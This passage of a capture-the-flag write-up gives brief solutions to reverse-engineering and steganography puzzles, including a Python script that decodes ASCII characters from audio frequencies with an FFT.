Because the transcription in russian had different translation!!!!!!!!  
one of them reveals qwerty cipher russian version of the flag.
Hilarious! Nice work Prof!

# Reverse 300 - Think Different, Be Similar
Its a .net compiled application into exe.  
Opening it with ILspy reveals the request structure needed to be sent to https://www.nvstgt.com/ to fetch the flag.  

# Reverse 300 - Beef-Witted Mushrumps
There is a vm which does 6 operations: read, write to memory, add, subtract xor and print.  
Upon inspecting the provided bytecode, it seems each char is xored with the next in memory and printed.  
reversing this xor, with the known flag prefix reveals the flag.  

# Reverse 400 - Forjeskit Sair with Weary Legs
Ida reveals python code packed into executable.  
1. pyinstxtractor to unpack exe to python compiled files.  
2. use pycdc to decompile pyc into py sourcecode.

# Stego 200 - You Never Liked My Music
view spectogram at high freq, 20000 - strong signals which look like morse!  
Zooming in, discovering a binary pattern every 0.06secs - signal presence means 1, 0 otherwise.  
decoded the binary to the flag.  

# Stego 300 - Public Lies Private Truths
/encode_grid.js reveals 38 divs. Makes sense that each one is char in the flag.  
Upon inspecting the brightness and opacity, i found a logic.  
For ex. second div must be o, so 0.4 and 250% - 25*10 = o  
3rd must be c, also 0.4 and 130% - 13*10 more  
25-13=12 which is exactly the ordinal diff between o and c.  
continuing like this reveals all the flag.  

# Stego 300 - Observing Arming
Extract hidden channel using ffmpeg.  
Viewing spectogram reveals a repetitive pattern every 2 seconds.  
The idea is to extract fft values every 0.05 seconds,  
increasing resolution by applying hanning to the segment and padding,  
then extracting the dominant freq.  

```python
import wave

import numpy as np

# Parameters
sample_rate = 44100  # Sampling rate in Hz
window_duration = 0.05  # Window size in seconds
window_length = int(sample_rate * window_duration)

# Frequency range for ASCII detection
low_freq = 32  # Lower bound in Hz
high_freq = 128  # Upper bound in Hz

file_path = "2_seconds.wav"

with wave.open(file_path, 'rb') as wav_file:
    sample_rate = wav_file.getframerate()  # Sampling rate
    n_channels = wav_file.getnchannels()  # Number of audio channels
    n_samples = wav_file.getnframes()  # Total number of samples
    duration = n_samples / sample_rate  # Duration in seconds
    audio_data = wav_file.readframes(n_samples)
    audio_array = np.frombuffer(audio_data, dtype=np.int16)  # Convert to NumPy array

flag = ""
# Analyze data in chunks
for i in range(0, len(audio_array), window_length):
    segment = audio_array[i:i + window_length]
    if len(segment) < window_length:
        break  # Skip last segment if smaller than window size

    segment = segment * np.hanning(len(segment))
    zero_padded_segment = np.pad(segment, (0, sample_rate - len(segment)), 'constant')

    # Perform FFT
    fft_magnitude = np.abs(np.fft.rfft(zero_padded_segment))
    freqs = np.fft.rfftfreq(len(zero_padded_segment), d=1/sample_rate)

    # Filter frequencies in the range 32â€“128 Hz
    mask = (freqs >= low_freq) & (freqs <= high_freq)
    filtered_freqs = freqs[mask]
    filtered_magnitude = fft_magnitude[mask]

    # Find dominant frequency in the range
    if len(filtered_freqs) > 0:
        dominant_freq = filtered_freqs[np.argmax(filtered_magnitude)]
        ascii_character = chr(int(dominant_freq))  # Map frequency to ASCII
        print(f"Dominant Frequency: {dominant_freq:.2f} Hz -> ASCII: {ascii_character}")
        flag += ascii_character

print(flag)
```

# Stego 400 - He Pretends to Be a Boor
open image in hex editor shows flag is scrambled in one of the first chunks of the jpeg.  
Upon reading about quantization table chunk, it appears its encoded in a diagonal zig-zag way.  
Reconstructing the flag the same way reveals it.  
Cool non-standard steg challenge i liked this one!
